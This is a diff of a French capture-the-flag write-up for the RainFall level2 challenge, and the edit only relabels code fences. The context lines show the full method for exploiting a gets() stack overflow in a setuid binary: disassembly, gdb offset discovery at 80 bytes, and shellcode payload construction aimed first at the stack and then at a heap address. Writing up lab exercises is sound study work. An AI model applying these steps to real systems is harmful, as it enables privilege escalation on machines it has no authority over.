@@ -1,11 +1,11 @@
 On a un binaire avec le flag setuid
-```
+```sh
 level2@RainFall:~$ ls -l
 total 8
 -rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
 ```
 On désassemble
-```asm
+```sh
 level2@RainFall:~$ objdump -d intel  ./level2 -M intel
 080484d4 <p>:
  80484d4:	55                   	push   ebp
@@ -63,7 +63,7 @@ Il semble vérifier si **eax** contient une adresse appartenant à la plage 0xb0
 Étant donné qu'il n'y a pas de fonction cachée avec un appel à **system** comme dans **level1**, nous devrons injecter la nôtre.
 Nous allons d'abord essayer de détourner le registre de retour **eax** pour exploiter la vulnérabilité de **gets**. L'adresse de retour sera celle du buffer de **gets**, et le buffer contiendra du **shellcode**.
 Nous utilisons la même tactique que pour **level1** afin de déterminer l'offset :
-```
+```sh
 level2@RainFall:~$ python /tmp/pattern3.py
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 level2@RainFall:~$ gdb -q ./level2
@@ -110,7 +110,7 @@ level2@RainFall:~$ python /tmp/pattern3.py /tmp/2.txt 0x37634136
 offset found at: 80
 ```
 On a trouvé un offset à 80 octets. Essayons d'injecter le **shelcode** à l'adresse de retour:
-```
+```sh
 level2@RainFall:~$ gdb -q ./level2
 Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
 (gdb) b main
@@ -161,7 +161,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 On veut le buffer de retour, donc on met un break point après l'appel a **gets**: 0x080484f2 
-```
+```sh
 (gdb) b *0x080484f2
 Breakpoint 3 at 0x80484f2
 (gdb) s
@@ -190,7 +190,7 @@ gs             0x33     51
 ```
 Dans eax le buffer est à 0xbffff6dc, essayond 'injecter ici.
 Le shellcode fait 21 octets, la limite est de 80, donc le payload est constitué de 21 octets + 59 octets random + 4 octets pour l'adresse, soit 80 octets au total.
-```
+```sh
 level2@RainFall:~$ python /tmp/exploit3.py  0xbffff6dc 59
 crafting payload...
 done:
@@ -201,7 +201,7 @@ level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2
 
 ```
 Cela a échoué parce que nous ne pouvons pas écrire sur la Stack, mais sur la Heap, cela semble fonctionner. strdup renvoie l'adresse suivante :
-```
+```sh
 level2@RainFall:~$ ltrace ./level2
 __libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
 fflush(0xb7fd1a20)                       = 0
@@ -215,7 +215,7 @@ strdup("TEST!")                          = 0x0804a008
 +++ exited (status 8) +++
 ```
 Nous réessayons avec cette adresse allouée par **malloc**:
-```
+```sh
 level2@RainFall:~$ python /tmp/exploit3.py  0x0804a008 59
 crafting payload...
 done:
